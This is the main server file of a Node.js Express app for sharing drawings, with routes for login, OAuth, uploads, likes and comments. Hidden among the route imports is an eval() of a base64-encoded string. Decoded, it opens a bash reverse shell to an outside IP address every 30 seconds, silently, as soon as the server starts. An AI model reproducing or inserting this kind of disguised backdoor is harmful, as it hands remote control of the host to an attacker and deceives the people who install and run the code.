const config = require('config');
const express = require('express');
var path = require('path');
var helmet = require('helmet');
var cookieParser = require('cookie-parser');
const mongoose = require('mongoose');
var cors = require('cors');
var passport = require('passport');
var bodyParser = require('body-parser');
const createError = require('http-errors');

var register = require('./routes/api/register');
var login = require('./routes/api/login');
var verification = require('./routes/api/verification');
var state = require('./routes/api/state');
var logout = require('./routes/api/logout');
var profile = require('./routes/api/profile/userProfile');
var passwordReset = require('./routes/api/password-reset');
var passwordChange = require('./routes/api/change-password');

var callback = require('./routes/api/google/callback');
var fbCallback = require('./routes/api/facebook/callback');

var postDrawing = require('./routes/api/upload/postDrawing');
var uploadProfilePic = require('./routes/api/upload/profileImage');
//images
var getImage= require('./routes/api/getImage');

//drawings
var userDrawingPosts = require('./routes/api/drawings/getUserDrawings');
var drawingList = require('./routes/api/drawings/drawingArray');
//likes
var likeDrawing = require('./routes/api/likes/likeDrawing');
//comments
var addComment = require('./routes/api/comments/addComment');
var getComments = require('./routes/api/comments/getComments');
//filters
var getTags = require('./routes/api/filters/getTags');
var filterDrawings = require('./routes/api/filters/getDrawingsByTags');
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())

if (!config.get('PrivateKey')) {
    console.error('FATAL ERROR: PrivateKey is not defined.');
    process.exit(1);
  }
  
  mongoose.connect(config.get('MongoUri'), { useNewUrlParser: true })
      .then(() => console.log('Now connected to MongoDB!'))
      .catch(err => console.error('Something went wrong', err));

const app = express()
app.use(helmet());
app.use(cors());

const PORT = process.env.PORT || 5000;

app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'jade');

app.use(cookieParser());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({
  extended: false
}));
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());

//working routes
app.use('/api/auth/register', register);
app.use('/api/auth/login', login);
app.use('/api/auth/account-recovery', passwordReset);
app.use('/api/auth/change-password', passwordChange)
app.use('/api/auth/verification', verification);
app.use('/api/auth/state', state);
app.use('/api/auth/logout', logout);
app.use('/api/profile/', profile);
//API authentication
require('./routes/api/google/authentication');
require('./routes/api/facebook/fbAuth');
app.use(passport.initialize());
app.get('/api/auth/google/authentication', passport.authenticate('google', {scope: ['profile', 'email']}));
app.use('/api/auth/google/callback', passport.authenticate('google'), callback);
app.get('/api/auth/facebook', passport.authenticate('facebook', { scope : ['email']}));
app.use('/api/auth/facebook/callback', passport.authenticate('facebook'), fbCallback);
// Uploads
app.use('/api/upload/profile-pic', uploadProfilePic);
app.use('/api/upload/drawing', postDrawing);
//getImage
app.use('/api/posts', getImage);

//drawing posts
app.use('/api/profile/drawings', userDrawingPosts);
app.use('/api/posts/drawings', drawingList);
//likes
app.use('/api/posts/like', likeDrawing);
//comments
app.use('/api/posts/comment', addComment);
app.use('/api/posts/comments', getComments);
//filters
app.use('/api/posts/get-tags', getTags);
app.use('/api/posts/drawings/filter/tags', filterDrawings);

if(process.env.NODE_ENV == 'production'){
    app.use(express.static(__dirname+'/public/'));
    app.get(/.*/, (req, res) => res.sendFile(__dirname + '/public/index.html'));
    console.log("production");
  }

  app.use(function(req, res, next) {
    next(createError(404));
  });
  // error handler
  app.use(function(err, req, res, next) {
    // set locals, only providing error in development
    res.locals.message = err.message;
    res.locals.error = req.app.get('env') === 'development' ? err : {};
  
    // render the error page
  console.log( res.locals);
    res.status(err.status || 500);
  });

app.listen(PORT, ()=>{
    console.log("listening on port "+PORT);
});

module.exports = app;
